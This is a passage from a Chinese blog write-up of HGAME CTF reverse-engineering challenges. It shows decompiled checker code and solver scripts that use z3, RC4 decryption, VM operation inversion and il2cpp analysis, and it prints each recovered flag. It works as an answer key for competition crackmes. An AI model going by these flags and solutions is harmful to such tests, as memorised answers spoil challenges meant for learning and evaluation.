class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">input = (<span class="keyword">char</span> *)CmpData;</span><br><span class="line"><span class="built_in">memset</span>(CmpData, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">v38[<span class="number">0</span>] = <span class="number">55030</span>;</span><br><span class="line">v38[<span class="number">1</span>] = <span class="number">61095</span>;</span><br><span class="line">v38[<span class="number">2</span>] = <span class="number">60151</span>;</span><br><span class="line">v38[<span class="number">3</span>] = <span class="number">57247</span>;</span><br><span class="line">v38[<span class="number">4</span>] = <span class="number">56780</span>;</span><br><span class="line">v38[<span class="number">5</span>] = <span class="number">55726</span>;</span><br><span class="line">v38[<span class="number">6</span>] = <span class="number">46642</span>;</span><br><span class="line">v38[<span class="number">7</span>] = <span class="number">52931</span>;</span><br><span class="line">v38[<span class="number">8</span>] = <span class="number">53580</span>;</span><br><span class="line">v38[<span class="number">9</span>] = <span class="number">50437</span>;</span><br><span class="line">v38[<span class="number">10</span>] = <span class="number">50062</span>;</span><br><span class="line">v38[<span class="number">11</span>] = <span class="number">44186</span>;</span><br><span class="line">v38[<span class="number">12</span>] = <span class="number">44909</span>;</span><br><span class="line">v38[<span class="number">13</span>] = <span class="number">46490</span>;</span><br><span class="line">v38[<span class="number">14</span>] = <span class="number">46024</span>;</span><br><span class="line">v38[<span class="number">15</span>] = <span class="number">44347</span>;</span><br><span class="line">v38[<span class="number">16</span>] = <span class="number">43850</span>;</span><br><span class="line">v38[<span class="number">17</span>] = <span class="number">44368</span>;</span><br><span class="line">v38[<span class="number">18</span>] = <span class="number">54990</span>;</span><br><span class="line">v38[<span class="number">19</span>] = <span class="number">61884</span>;</span><br><span class="line">v38[<span class="number">20</span>] = <span class="number">61202</span>;</span><br><span class="line">v38[<span class="number">21</span>] = <span class="number">58139</span>;</span><br><span class="line">v38[<span class="number">22</span>] = <span class="number">57730</span>;</span><br><span class="line">v38[<span class="number">23</span>] = <span class="number">54964</span>;</span><br><span class="line">v38[<span class="number">24</span>] = <span class="number">48849</span>;</span><br><span class="line">v38[<span class="number">25</span>] = <span class="number">51026</span>;</span><br><span class="line">v38[<span class="number">26</span>] = <span class="number">49629</span>;</span><br><span class="line">v38[<span class="number">27</span>] = <span class="number">48219</span>;</span><br><span class="line">v38[<span class="number">28</span>] = <span class="number">47904</span>;</span><br><span class="line">v38[<span class="number">29</span>] = <span class="number">50823</span>;</span><br><span class="line">v38[<span class="number">30</span>] = <span class="number">46596</span>;</span><br><span class="line">v38[<span class="number">31</span>] = <span class="number">50517</span>;</span><br><span class="line">v38[<span class="number">32</span>] = <span class="number">48421</span>;</span><br><span class="line">v38[<span class="number">33</span>] = <span class="number">46143</span>;</span><br><span class="line">v38[<span class="number">34</span>] = <span class="number">46102</span>;</span><br><span class="line">v38[<span class="number">35</span>] = <span class="number">46744</span>;</span><br><span class="line">v37[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">v37[<span class="number">1</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">v37[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">v37[<span class="number">3</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">v37[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">v37[<span class="number">5</span>] = <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">v37[<span class="number">6</span>] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">v37[<span class="number">7</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">8</span>] = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">v37[<span class="number">9</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">v37[<span class="number">10</span>] = <span class="string">&#x27;K&#x27;</span>;</span><br><span class="line">v37[<span class="number">11</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">v37[<span class="number">12</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">13</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">v37[<span class="number">14</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">v37[<span class="number">15</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">v37[<span class="number">16</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">v37[<span class="number">17</span>] = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">v37[<span class="number">18</span>] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">v37[<span class="number">19</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">v37[<span class="number">20</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v37[<span class="number">21</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">22</span>] = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">v37[<span class="number">23</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">v37[<span class="number">24</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">v37[<span class="number">25</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">26</span>] = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">v37[<span class="number">27</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v37[<span class="number">28</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">v37[<span class="number">29</span>] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">v37[<span class="number">30</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">31</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">v37[<span class="number">32</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">v37[<span class="number">33</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v37[<span class="number">34</span>] = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">v37[<span class="number">35</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">v44 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">5</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(input) = CmpData[<span class="number">6</span> * i + j] + v37[<span class="number">6</span> * k + j] * *(_DWORD *)&amp;a1[<span class="number">24</span> * i + <span class="number">4</span> * k];</span><br><span class="line">      CmpData[<span class="number">6</span> * i + j] = (<span class="keyword">int</span>)input;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察后发现就是一个6*6的矩阵运算，z3解之</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">res = [ <span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span> ]</span><br><span class="line">x = [BitVec(<span class="string">&quot;x_%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line">y = [<span class="number">104</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">65</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">33</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">89</span>,<span class="number">48</span>,<span class="number">117</span>,<span class="number">95</span>,<span class="number">107</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">95</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">67</span>,<span class="number">63</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        key=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            key += y[<span class="number">6</span>*n+j]*x[<span class="number">6</span>*i+n]</span><br><span class="line">        <span class="comment">#print(i*6+j)</span></span><br><span class="line">        s.add(key == res[i*<span class="number">6</span>+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">        char = s.model().eval(x[i]).as_long()</span><br><span class="line">        flag += chr(char)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRE3"><a href="#helloRE3" class="headerlink" title="helloRE3"></a>helloRE3</h3><p>这道题没有搞出来，后面看wp复现，对于windows消息机制以及带界面的程序逆向不熟悉。</p><p>在点击Check时，Dbgview显示order为65并且显示输入长度。</p><p><img src="HGAME.assets/image-20210327204733340.png"></p><p>打开ida搜索字符串player找到对应函数，发现有一处 == 65的判定，会给一个值复制为1，x交叉引用发现一只一个函数调用了该全区变量</p><p>但是会提示函数无法f5，因为栈指针不平衡。</p><p><img src="HGAME.assets/image-20210327204821903.png"></p><p><img src="HGAME.assets/image-20210327205121970.png"></p><p>找到对应的地址，发现有call pop结构，目的是为了将call指令的下一条地址送入rax寄存器中，这里将rax设置为0x00007FF708DE8C3E作为下面rc4加密的秘钥。修复栈指针查看伪代码。<img src="HGAME.assets/image-20210327205950305.png" alt="image-20210327205950305"></p><p><img src="HGAME.assets/image-20210327210024334.png"></p><p>加密流程比较简单，order中的数值取反，RC4加密，比较，RC4的key长度为20，值为地址0x00007FF708DE8C3E处开始的硬编码</p><p><img src="HGAME.assets/image-20210327210113633.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解密脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_rc4</span>():</span></span><br><span class="line">    Cipher = bytes([<span class="number">77</span>, <span class="number">175</span>, <span class="number">39</span>, <span class="number">173</span>, <span class="number">225</span>, <span class="number">236</span>, <span class="number">109</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">107</span>, <span class="number">8</span>, <span class="number">200</span>, <span class="number">73</span>])</span><br><span class="line">    Key = bytes([<span class="number">144</span>, <span class="number">144</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">208</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">2</span>])</span><br><span class="line">    rc4 = ARC4.new(Key)</span><br><span class="line">    Plain = rc4.decrypt(Cipher)</span><br><span class="line"></span><br><span class="line">    Plain = list(<span class="number">0xff</span>^i <span class="keyword">for</span> i <span class="keyword">in</span> Plain)</span><br><span class="line">    <span class="keyword">return</span> Plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_in_order</span>(<span class="params">Plain</span>):</span></span><br><span class="line">    order = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">33</span>)]+[i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>,<span class="number">50</span>)]+[i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>,<span class="number">76</span>)]</span><br><span class="line">    name = list(<span class="string">&#x27;1234567890-+QWERTYUIOP&#123;&#125;|ASDFGHJKL;\&#x27;~ZXCVBNM,./&#x27;</span>)</span><br><span class="line">    key = dict(zip(order,name)) <span class="comment"># 生成对应的字典</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Plain:</span><br><span class="line">        flag += key[i]</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">find_in_order(decrypt_rc4())</span><br><span class="line"></span><br><span class="line"><span class="comment"># HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week4"><a href="#RE-week4" class="headerlink" title="RE-week4"></a>RE-week4</h2><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p><img src="HGAME.assets/image-20210326203838665.png"></p><p>看似很复杂，其实是输入单个字节的加解密，经过动态调试后发现只有异或和减操作，分别对应到的虚拟机指令是4和7，过程为将输入送入vm_eax寄存器，vm_ebx寄存器中是生成的操作数，动态调试即可获得。</p><p><img src="HGAME.assets/image-20210326203955786.png"></p><p><img src="HGAME.assets/image-20210326204041935.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cipher[] = &#123; <span class="number">9</span>, <span class="number">230</span>, <span class="number">79</span>, <span class="number">183</span>, <span class="number">219</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">173</span>, <span class="number">232</span>, <span class="number">54</span>, <span class="number">118</span>, <span class="number">198</span>, <span class="number">240</span>, <span class="number">23</span>, <span class="number">103</span>, <span class="number">162</span>, <span class="number">247</span>, <span class="number">231</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">58</span>, <span class="number">112</span>, <span class="number">237</span>, <span class="number">36</span>, <span class="number">2</span>, <span class="number">126</span>, <span class="number">175</span>, <span class="number">246</span>, <span class="number">59</span>, <span class="number">128</span>, <span class="number">191</span>, <span class="number">207</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Xor[] = &#123; <span class="number">0xfe</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xd0</span>,<span class="number">0xf3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa3</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x0</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Sub[] = &#123; <span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (cipher[i] + Sub[i]) ^ Xor[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AFiveSecondChallenge"><a href="#AFiveSecondChallenge" class="headerlink" title="AFiveSecondChallenge"></a>AFiveSecondChallenge</h3><p>比赛时没有做出来，对于c#不熟悉，即使主办方在最后放出了白给Hint，还是搞不出矩阵来，看wp慢慢复现。</p><p>首先这是一个扫雷游戏，用c#写的，扫雷的逻辑题目中说明的是通过矩阵运算，所以直接用C#反编译器看看能不能直接搞到源码。但是发现矩阵运算函数被动过手脚。</p><p><img src="HGAME.assets/image-20210329191243753.png"></p><p>matrix中的数据很多，根据官方给的提示下载文件中给出了il2cppOutPut文件中有两个重要文件<code>AFiveSecondChallenge</code>和<code>Assembly-CSharp</code>，这两个文件中有游戏中的所有逻辑。这里只分析<code>CheckBombAt</code>函数。</p><p>在<code>Assembly-CSharp</code>文件中看到了这些注释，CheckBombAt函数只有一个参数叫<code>Vector2</code>，向量中存储的是数组的坐标，但是matrix数组是一个三维数组，但是这个向量中只存储了x和y坐标。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.Boolean AFiveSecondChallenge.BombChecker::CheckBombAt(UnityEngine.Vector2)</span><br><span class="line">    </span><br><span class="line">BombChecker.CheckBombAt(_position)</span><br><span class="line">    </span><br><span class="line">BombChecker.CheckBombAt(<span class="keyword">new</span> Vector2(x - <span class="number">1</span>, y - <span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>在看<code>AFiveSecondChallenge.cpp</code>文件，直接搜索CheckBomAt关键字，定位到该函数。发现了矩阵与运算的主要逻辑</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_21 = ___vec0; <span class="comment">// 循环时的变量</span></span><br><span class="line"><span class="keyword">float</span> L_22 = L_21.get_x_0();</span><br><span class="line">V_2 = (((<span class="keyword">double</span>)((<span class="keyword">double</span>)((<span class="keyword">float</span>)il2cpp_codegen_subtract((<span class="keyword">float</span>)(fmodf(L_22, (<span class="number">3.0f</span>))), (<span class="keyword">float</span>)(<span class="number">1.0f</span>))))));</span><br><span class="line"><span class="keyword">double</span> L_23 = V_2; </span><br><span class="line"><span class="keyword">double</span> L_24 = V_2;</span><br><span class="line"><span class="keyword">double</span> L_25 = V_0; <span class="comment">// y下标</span></span><br><span class="line"><span class="keyword">double</span> L_26 = V_2;</span><br><span class="line"><span class="keyword">double</span> L_27 = V_1; <span class="comment">// z下标</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">bool</span>)((((<span class="keyword">double</span>)((<span class="keyword">double</span>)il2cpp_codegen_add((<span class="keyword">double</span>)((<span class="keyword">double</span>)il2cpp_codegen_add((<span class="keyword">double</span>)((<span class="keyword">double</span>)il2cpp_codegen_multiply((<span class="keyword">double</span>)((<span class="keyword">double</span>)il2cpp_codegen_multiply((<span class="keyword">double</span>)L_8, (<span class="keyword">double</span>)L_23)), (<span class="keyword">double</span>)L_24)), (<span class="keyword">double</span>)((<span class="keyword">double</span>)il2cpp_codegen_multiply((<span class="keyword">double</span>)L_25, (<span class="keyword">double</span>)L_26)))), (<span class="keyword">double</span>)L_27))) &gt; ((<span class="keyword">double</span>)(<span class="number">0.0</span>)))? <span class="number">1</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>上面的代码化简后就是下面的数学表达式，提取matrix进行图片绘制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v_2 &#x3D; (j % 3) - 1;</span><br><span class="line">((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> matrix[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;...&#125;;  <span class="comment">// 数据太多省略</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"><span class="keyword">double</span> x, y, z;</span><br><span class="line"><span class="keyword">int</span> dot;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++) &#123;</span><br><span class="line"><span class="keyword">double</span> v_2 = (j % <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">x = matrix[i][j / <span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">y = matrix[i][j / <span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">z = matrix[i][j / <span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">dot = ((x * (v_2 * v_2) + y * v_2 + z) &gt; <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"><span class="built_in">map</span>[i][j] = dot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后大概是这样，可以看到是一个二维码。</p><img src="HGAME.assets/image-20210329193504145.png" style="zoom:67%;" /><p>再用python的PIL库将其打印成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">45</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(MAX,MAX))</span><br><span class="line">dot = <span class="string">&quotquot;</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">45</span>):</span><br><span class="line">        <span class="keyword">if</span> dot[i*x+j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag: hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h3><p>这个程序对里面所有的字符串进行了加密，需要慢慢寻找加密函数，在动态调试后发现了AES的S_box盒子，且发现加密模式为CBC模式，动调出key与iv后直接写脚本解密，初始iv为0-15</p><figure class="highlight 